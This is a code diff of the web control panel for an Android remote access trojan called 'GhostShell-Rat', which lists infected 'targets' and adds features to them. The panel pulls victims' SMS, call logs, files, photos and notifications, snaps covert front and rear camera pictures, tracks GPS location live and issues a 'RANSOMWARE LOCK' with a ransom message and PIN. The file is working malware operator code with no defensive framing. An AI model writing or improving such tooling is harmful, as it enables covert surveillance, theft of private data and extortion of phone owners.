@@ -6,7 +6,11 @@
     <title>GhostShell-Rat · anonymous</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', monospace; }
+        * {
+            margin: 0; padding: 0; box-sizing: border-box;
+            font-family: 'Segoe UI', 'Courier New', monospace, system-ui;
+        }
+
         :root {
             --bg: #0b0f0e;
             --surface: #141a1a;
@@ -14,66 +18,172 @@
             --accent-primary: #00ffc3;
             --accent-secondary: #ff3b9e;
             --glow-primary: rgba(0, 255, 195, 0.25);
+            --glow-secondary: rgba(255, 59, 158, 0.3);
             --text: #dbdbdb;
             --text-dim: #8fadad;
+            --border-glow: 0 0 0 1px var(--accent-primary), 0 0 12px var(--glow-primary);
             --transition: all 0.25s cubic-bezier(0.23, 1, 0.32, 1);
         }
-        body { background-color: var(--bg); color: var(--text); min-height: 100vh; padding: 8px; display: flex; align-items: flex-start; justify-content: center; background-image: radial-gradient(circle at 20% 30%, #10312b 0%, transparent 40%); background-attachment: fixed; }
-        #sys-loader { position: fixed; inset: 0; background: var(--bg); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.6s ease, visibility 0.6s; }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            padding: 8px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            background-image: radial-gradient(circle at 20% 30%, #10312b 0%, transparent 40%);
+            background-attachment: fixed;
+        }
+
+        /* system loading bar — entrance */
+        #sys-loader {
+            position: fixed; inset: 0; background: var(--bg);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 9999; transition: opacity 0.6s ease, visibility 0.6s;
+            backdrop-filter: blur(4px);
+        }
         .loader-hidden { opacity: 0; visibility: hidden; pointer-events: none; }
-        .cyber-bar { width: 260px; height: 6px; background: #1f2b2b; border-radius: 8px; margin: 20px 0 10px; overflow: hidden; }
-        .cyber-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary)); box-shadow: 0 0 18px var(--glow-primary); transition: width 0.3s; }
+        .cyber-bar {
+            width: 260px; height: 6px; background: #1f2b2b; border-radius: 8px;
+            box-shadow: inset 0 0 6px #000; margin: 20px 0 10px; overflow: hidden;
+        }
+        .cyber-fill {
+            height: 100%; width: 0%; border-radius: 8px;
+            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
+            box-shadow: 0 0 18px var(--glow-primary); transition: width 0.3s;
+        }
+        #loader-text {
+            font-size: 1.6rem; font-weight: 300; letter-spacing: 6px;
+            color: var(--accent-primary); text-shadow: 0 0 8px var(--accent-primary);
+            animation: flicker 2.4s infinite;
+        }
+
+        /* main app container */
         .app-container { width: 100%; max-width: 1300px; display: flex; flex-direction: column; gap: 14px; }
-        .header { background: var(--surface); border: 1px solid var(--accent-primary); box-shadow: 0 0 15px var(--glow-primary); padding: 1rem 1.2rem; border-radius: 28px; display: flex; align-items: center; justify-content: space-between; }
+
+        .header {
+            background: var(--surface); border: 1px solid var(--accent-primary);
+            box-shadow: 0 0 15px var(--glow-primary); padding: 1rem 1.2rem;
+            border-radius: 28px; display: flex; align-items: center; justify-content: space-between;
+        }
+        .header h1 {
+            font-size: 1.8rem; font-weight: 400; letter-spacing: 2px;
+            background: linear-gradient(135deg, #b0ffec, var(--accent-secondary));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+
         .dashboard-grid { display: grid; grid-template-columns: 260px 1fr; gap: 16px; }
-        .device-panel { background: var(--surface); border-radius: 28px; border: 1px solid var(--accent-primary); padding: 18px 12px; max-height: 70vh; overflow-y: auto; }
-        .device-item { background: #1b2626; padding: 14px 12px; border-radius: 18px; cursor: pointer; transition: var(--transition); margin-bottom: 8px; border: 1px solid transparent; }
-        .device-item.active { border-color: var(--accent-secondary); box-shadow: 0 0 12px var(--glow-secondary); }
+
+        .device-panel {
+            background: var(--surface); border-radius: 28px; border: 1px solid var(--accent-primary);
+            padding: 18px 12px; box-shadow: var(--border-glow); max-height: 70vh; overflow-y: auto;
+        }
+        .device-panel h2 { font-size: 1.2rem; margin-bottom: 16px; color: var(--accent-secondary); }
+        .device-item {
+            background: #1b2626; padding: 14px 12px; border-radius: 18px; cursor: pointer;
+            transition: var(--transition); margin-bottom: 8px; border: 1px solid transparent;
+        }
+        .device-item.active { border-color: var(--accent-secondary); box-shadow: 0 0 16px var(--glow-secondary); }
+
         .main-panel { background: var(--surface); border-radius: 28px; border: 1px solid var(--accent-primary); padding: 18px 16px; }
-        .status-bar-mod { display: flex; justify-content: space-between; background: #0f1818; padding: 12px 18px; border-radius: 40px; margin-bottom: 22px; border: 1px solid #2a3a3a; }
+        .status-bar-mod {
+            display: flex; justify-content: space-between; background: #0f1818; padding: 12px 18px;
+            border-radius: 40px; margin-bottom: 22px; border: 1px solid #2a3a3a;
+        }
+
         .feature-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 12px; }
-        .grid-item { background: #1b2828; border: 1px solid #2f4040; border-radius: 24px; padding: 16px 6px; text-align: center; color: var(--accent-primary); transition: var(--transition); cursor: pointer; }
+        .grid-item {
+            background: #1b2828; border: 1px solid #2f4040; border-radius: 24px; padding: 16px 6px;
+            text-align: center; color: var(--accent-primary); transition: var(--transition); cursor: pointer;
+        }
         .grid-item i { font-size: 2rem; margin-bottom: 8px; display: block; color: var(--accent-secondary); }
-        .modal { display: none; position: fixed; inset: 0; background: rgba(2, 10, 10, 0.85); backdrop-filter: blur(8px); align-items: center; justify-content: center; z-index: 1000; padding: 16px; }
-        .modal-card { background: var(--surface); width: 100%; max-width: 900px; max-height: 85vh; border-radius: 36px; border: 1px solid var(--accent-primary); display: flex; flex-direction: column; overflow: hidden; }
-        .modal-header { padding: 20px 24px; background: #101b1b; display: flex; justify-content: space-between; align-items: center; }
-        .modal-body { padding: 22px; overflow-y: auto; flex: 1; font-size: 0.9rem; }
+        .grid-item:hover { border-color: var(--accent-primary); box-shadow: 0 0 20px var(--glow-primary); }
+
+        .modal {
+            display: none; position: fixed; inset: 0; background: rgba(2, 10, 10, 0.85);
+            backdrop-filter: blur(8px); align-items: center; justify-content: center; z-index: 1000;
+        }
+        .modal-card {
+            background: var(--surface); width: 100%; max-width: 900px; max-height: 85vh;
+            border-radius: 36px; border: 1px solid var(--accent-primary); display: flex; flex-direction: column; overflow: hidden;
+        }
+        .modal-header { padding: 22px 24px; background: #101b1b; display: flex; justify-content: space-between; align-items: center; }
+        .modal-body { padding: 22px; overflow-y: auto; flex: 1; }
         .modal-footer { padding: 16px 22px; background: #0c1616; display: flex; gap: 12px; border-top: 1px solid #2e4545; }
-        .toast-popup { position: fixed; top: 24px; right: 24px; background: #121f1f; border-left: 6px solid var(--accent-secondary); padding: 18px 24px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--accent-primary); color: white; z-index: 3000; animation: slideIn 0.3s forwards; }
+
+        .toast-popup {
+            position: fixed; top: 24px; right: 24px; background: #121f1f;
+            border-left: 6px solid var(--accent-secondary); padding: 18px 24px; border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid var(--accent-primary);
+            color: white; z-index: 3000; animation: slideIn 0.3s forwards; max-width: 350px;
+        }
+
         table { width: 100%; border-collapse: collapse; }
-        th { text-align: left; color: var(--accent-primary); border-bottom: 1px solid #3d5a5a; padding: 8px; }
+        th { text-align: left; color: var(--accent-primary); padding: 8px; border-bottom: 1px solid #3d5a5a; }
         td { padding: 8px; border-bottom: 1px solid #1e2e2e; color: var(--text-dim); }
-        input, button { background: #1e2e2e; border: 1px solid #3b5e5e; padding: 10px 18px; border-radius: 20px; color: white; }
-        button { background: var(--accent-primary); color: #000; font-weight: bold; border: none; cursor: pointer; }
-        @keyframes slideIn { from { transform: translateX(400px); } to { transform: translateX(0); } }
+
+        input, button { background: #1e2e2e; border: 1px solid #3b5e5e; padding: 12px 18px; border-radius: 60px; color: white; }
+        button { background: var(--accent-primary); color: #000; font-weight: bold; border: none; cursor: pointer; transition: 0.2s; }
+        button:active { transform: scale(0.95); }
+
+        @keyframes slideIn { from { transform: translateX(450px); } to { transform: translateX(0); } }
+        @keyframes flicker { 0%, 45%, 47%, 49%, 90%, 92%, 100% { opacity: 1; } 46%, 48%, 91% { opacity: 0.2; } }
     </style>
 </head>
 <body>
-    <div id="sys-loader"><div id="loader-text">GHOST//SHELL</div><div class="cyber-bar"><div class="cyber-fill" id="loader-fill"></div></div></div>
+    <div id="sys-loader">
+        <div id="loader-text">GHOST//SHELL</div>
+        <div class="cyber-bar"><div class="cyber-fill" id="loader-fill"></div></div>
+    </div>
+
     <div class="app-container">
-        <header class="header"><h1><i class="fas fa-skull"></i> GhostShell-Rat</h1><div class="ghost-icon"><i class="fas fa-ghost"></i></div></header>
+        <header class="header">
+            <h1><i class="fas fa-skull"></i> GhostShell-Rat</h1>
+            <div style="color:var(--accent-secondary);font-size:2rem;"><i class="fas fa-ghost"></i></div>
+        </header>
+
         <div class="dashboard-grid">
-            <div class="device-panel"><h2>TARGETS</h2><div id="device-list"></div></div>
+            <div class="device-panel">
+                <h2><i class="fas fa-satellite-dish"></i> TARGETS</h2>
+                <div id="device-list"></div>
+            </div>
+
             <div class="main-panel">
-                <div class="status-bar-mod"><span>🎯 <span id="device-info">None</span></span><span>⚡ <span id="connection-status">OFFLINE</span></span></div>
+                <div class="status-bar-mod">
+                    <span>🎯 <span id="device-info" style="color:var(--accent-primary);">None Selected</span></span>
+                    <span>⚡ <span id="connection-status">OFFLINE</span></span>
+                </div>
                 <div id="main-grid-panel" class="feature-grid"></div>
             </div>
         </div>
     </div>
-    <div id="main-modal" class="modal"><div class="modal-card"><div class="modal-header"><h2 id="modal-title"></h2><span style="cursor:pointer;font-size:2rem;" onclick="closeModal()">&times;</span></div><div class="modal-body" id="modal-body"></div><div class="modal-footer" id="modal-footer"></div></div></div>
-    <div id="popup-toast" class="toast-popup" style="display:none;"></div>
+
+    <div id="main-modal" class="modal">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h2 id="modal-title" style="color:var(--accent-secondary);"></h2>
+                <span style="cursor:pointer;font-size:2.2rem;color:var(--text-dim);" onclick="closeModal()">&times;</span>
+            </div>
+            <div class="modal-body" id="modal-body"></div>
+            <div class="modal-footer" id="modal-footer"></div>
+        </div>
+    </div>
+
+    <div id="popup-toast" class="toast-popup" style="display: none;"></div>
 
     <script>
         (function(){
             let w=0; const f=document.getElementById('loader-fill');
-            const i=setInterval(()=>{w+=10; f.style.width=w+'%'; if(w>=100){clearInterval(i); setTimeout(()=>document.getElementById('sys-loader').classList.add('loader-hidden'),500);}},50);
+            const i=setInterval(()=>{w+=4; f.style.width=w+'%'; if(w>=100){clearInterval(i); setTimeout(()=>document.getElementById('sys-loader').classList.add('loader-hidden'),500);}},30);
         })();
 
         let state = { devices: [] }, selectedClientId = null, currentModal = null, clientDataCache = {}, lastDataHashes = {};
 
-        function showPopup(type, msg, duration=6000) {
+        function showPopup(type, msg, duration=8000) {
             const t=document.getElementById('popup-toast'); t.style.display='block';
-            t.innerHTML=`<div style="display:flex;align-items:center;gap:12px;"><i class="fas fa-bell"></i><span>${msg}</span></div>`;
+            t.innerHTML=`<div style="display:flex;align-items:center;gap:15px;"><i class="fas fa-bell" style="font-size:1.5rem;color:var(--accent-secondary);"></i><span>${msg}</span></div>`;
             setTimeout(()=>t.style.display='none', duration);
         }
 
@@ -87,15 +197,18 @@
             const grid=document.getElementById('main-grid-panel'); const enabled=!!selectedClientId;
             const buttons=['sms','calls','filemanager','gallery','notifications','apps','lock','openurl','get_location','flash','takebackpic','takefrontpic'];
             grid.innerHTML = buttons.map(btn => {
-                let icon='fa-cog', label=btn;
-                if(btn==='sms') icon='fa-sms'; else if(btn==='calls') icon='fa-phone'; else if(btn==='filemanager') icon='fa-folder';
-                else if(btn==='gallery') icon='fa-images'; else if(btn==='lock') label='LOCK DEVICE', icon='fa-lock';
-                else if(btn==='get_location') label='LOKASI REALTIME', icon='fa-crosshairs';
-                return `<div class="grid-item" onclick="handleGridClick('${btn}')"><i class="fas ${icon}"></i>${label}</div>`;
+                let icon='fa-question', label=btn;
+                if(btn==='sms') icon='fa-sms'; else if(btn==='calls') icon='fa-phone-alt'; else if(btn==='filemanager') icon='fa-folder-open';
+                else if(btn==='gallery') icon='fa-images'; else if(btn==='notifications') icon='fa-bell';
+                else if(btn==='apps') icon='fa-th-large'; else if(btn==='lock') label='LOCK DEVICE', icon='fa-user-lock';
+                else if(btn==='openurl') icon='fa-external-link-alt'; else if(btn==='get_location') label='LOKASI REALTIME', icon='fa-crosshairs';
+                else if(btn==='flash') icon='fa-bolt'; else if(btn==='takebackpic') icon='fa-camera-retro'; else if(btn==='takefrontpic') icon='fa-camera';
+                return `<div class="grid-item ${!enabled?'disabled':''}" onclick="handleGridClick('${btn}')"><i class="fas ${icon}"></i>${label}</div>`;
             }).join('');
         }
 
         window.handleGridClick = (act) => {
+            if(!selectedClientId) return;
             if(act==='get_location') sendCommand('get_location');
             else openModal(act);
         }
@@ -103,16 +216,13 @@
         function openModal(type) {
             currentModal=type; document.getElementById('main-modal').style.display='flex';
             document.getElementById('modal-title').innerText=type.toUpperCase();
-            document.getElementById('modal-body').innerHTML='<p>Loading data from ghost...</p>';
+            document.getElementById('modal-body').innerHTML='<div style="text-align:center;padding:40px;"><i class="fas fa-spinner fa-spin" style="font-size:3rem;color:var(--accent-primary);"></i><p style="margin-top:15px;">Injecting request to ghost...</p></div>';
             const map={sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic'};
             if(map[type]) sendCommand(map[type]);
             renderModalContent();
         }
 
-        function closeModal() { 
-            if(currentModal==='gallery') sendCommand('exit_gallery');
-            document.getElementById('main-modal').style.display='none'; currentModal=null; 
-        }
+        function closeModal() { if(currentModal==='gallery') sendCommand('exit_gallery'); document.getElementById('main-modal').style.display='none'; currentModal=null; }
 
         function renderModalContent() {
             if(!currentModal || !selectedClientId) return;
@@ -125,44 +235,49 @@
             } else if(currentModal==='calls') {
                 const logs=data.call_logs||[];
                 body.innerHTML=`<table><tr><th>Number</th><th>Duration</th></tr>${logs.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
-            } else if(currentModal==='apps') {
-                const apps=data.apps||[];
-                body.innerHTML=`<table><tr><th>App Name</th><th>Package</th></tr>${apps.map(a=>`<tr><td>${a.appName}</td><td>${a.packageName}</td></tr>`).join('')}</table>`;
             } else if(currentModal==='lock') {
-                body.innerHTML=`<div style="text-align:center;"><input id="l-msg" placeholder="Message" style="width:100%;margin-bottom:10px;"><input id="l-pin" placeholder="PIN" style="width:100%;"></div>`;
-                footer.innerHTML=`<button onclick="sendLock()" style="width:100%">LOCK</button>`;
+                body.innerHTML=`<div style="text-align:center;padding:20px;"><h3 style="color:red;margin-bottom:15px;">⚠️ RANSOMWARE LOCK</h3><input id="l-msg" placeholder="Target Message" style="width:100%;margin-bottom:15px;"><input id="l-pin" placeholder="Unlock PIN (4-6 digits)" type="number" style="width:100%;text-align:center;letter-spacing:5px;"></div>`;
+                footer.innerHTML=`<button onclick="sendLock()" style="width:100%;background:red;color:white;">🔒 EXECUTE LOCK</button>`;
             } else if(currentModal==='get_location') {
                 if(data.location_url) {
                     const coords = data.location_url.split('q=')[1];
-                    body.innerHTML=`<div style="text-align:center;"><iframe width="100%" height="300" src="https://maps.google.com/maps?q=${coords}&z=15&output=embed"></iframe><p style="margin:10px 0;">📍 ${coords}</p><button onclick="sendCommand('stop_location')" style="background:red;color:white;width:100%">STOP TRACKING</button></div>`;
-                } else { body.innerHTML='<p>Triangulating GPS...</p>'; }
+                    const imgHtml = data.location_image ? `<img src="${data.location_image}" style="width:100%;border-radius:18px;margin-top:15px;border:2px solid var(--accent-primary);box-shadow:0 0 15px var(--glow-primary);">` : '';
+                    body.innerHTML=`<div style="text-align:center;"><iframe width="100%" height="280" style="border-radius:15px;" frameborder="0" src="https://maps.google.com/maps?q=${coords}&z=15&output=embed"></iframe><p style="margin:15px 0;color:var(--accent-primary);font-size:1.2rem;">📍 ${coords}</p><div style="display:flex;gap:10px;"><a href="${data.location_url}" target="_blank" style="flex:1;color:white;border:1px solid;padding:10px;border-radius:30px;text-decoration:none;">Open G-Maps</a><button onclick="sendCommand('stop_location')" style="flex:1;background:var(--accent-secondary);color:white;">STOP TRACKING</button></div>${imgHtml}</div>`;
+                    footer.innerHTML=`<button onclick="sendCommand('get_location')" style="width:100%;">FORCE REFRESH</button>`;
+                } else { body.innerHTML='<div style="text-align:center;padding:40px;"><i class="fas fa-satellite-dish fa-spin" style="font-size:3rem;color:var(--accent-secondary);"></i><p style="margin-top:15px;">Triangulating high-accuracy GPS...</p></div>'; }
             } else if(currentModal==='filemanager') {
                 const fm=data.file_manager||{path:'/',files:[]};
-                body.innerHTML=`<p>Path: ${fm.path}</p><table>${fm.files.map(f=>`<tr><td>${f.isDirectory?'📁':'📄'} ${f.name}</td></tr>`).join('')}</table>`;
+                body.innerHTML=`<p style="margin-bottom:10px;color:var(--accent-primary);">📍 ${fm.path}</p><table>${fm.files.map(f=>`<tr><td>${f.isDirectory?'📁':'📄'} ${f.name}</td><td><button onclick="sendCommand('get ${f.name}')" style="padding:4px 10px;font-size:0.7rem;">GET</button></td></tr>`).join('')}</table>`;
             } else if(currentModal.includes('pic')) {
-                if(data.camera_image) body.innerHTML=`<img src="/captured_images/${data.camera_image}" style="width:100%;border-radius:10px;">`;
-                else body.innerHTML='<p>Capturing photo...</p>';
+                if(data.camera_image) body.innerHTML=`<img src="/captured_images/${data.camera_image}" style="width:100%;border-radius:20px;border:2px solid var(--accent-primary);">`;
+                else body.innerHTML='<div style="text-align:center;padding:40px;"><i class="fas fa-camera fa-pulse" style="font-size:3rem;color:var(--accent-secondary);"></i><p style="margin-top:15px;">Capturing ghost image...</p></div>';
             }
         }
 
-        window.sendLock = () => { sendCommand(`lock ${document.getElementById('l-msg').value}|${document.getElementById('l-pin').value}`); };
+        window.sendLock = () => { const m=document.getElementById('l-msg').value||'SYSTEM HACKED'; const p=document.getElementById('l-pin').value||'1234'; sendCommand(`lock ${m}|${p}`); closeModal(); };
 
         async function poll() {
             try {
                 const res = await (await fetch('/api/status')).json(); state=res;
                 const list=document.getElementById('device-list');
                 list.innerHTML = state.devices.map(d=>`<div class="device-item ${selectedClientId===d.id?'active':''}" onclick="selectedClientId='${d.id}';updateMainDashboard();"><strong>${d.model}</strong><br><small>${d.id}</small></div>`).join('');
+                if(!selectedClientId && state.devices.length) selectedClientId=state.devices[0].id;
                 
                 if(selectedClientId) {
                     const d = await (await fetch(`/api/client_data/${selectedClientId}`)).json();
                     clientDataCache[selectedClientId]=d;
                     document.getElementById('device-info').innerText=d.device_info?.Model||selectedClientId;
                     document.getElementById('connection-status').innerText='ONLINE';
+                    document.getElementById('connection-status').className='status-online';
                     if(currentModal) renderModalContent();
                     
                     if(d.location_status==='success' && lastDataHashes['loc']!==d.location_url) {
                         lastDataHashes['loc']=d.location_url;
-                        showPopup('info', '🎯 TARGET TRACKED! Buka modal lokasi.');
+                        showPopup('info', '🎯 TARGET TRACKED! Buka modal LOKASI REALTIME.');
+                    }
+                    if(d.notifications?.length) {
+                        const n=d.notifications[0]; const h=selectedClientId+n.packageName+n.text;
+                        if(!notificationHashes.has(h)){ showPopup('info', `[${n.packageName}] ${n.title}: ${n.text}`); notificationHashes.add(h); }
                     }
                 }
             } catch(e){}
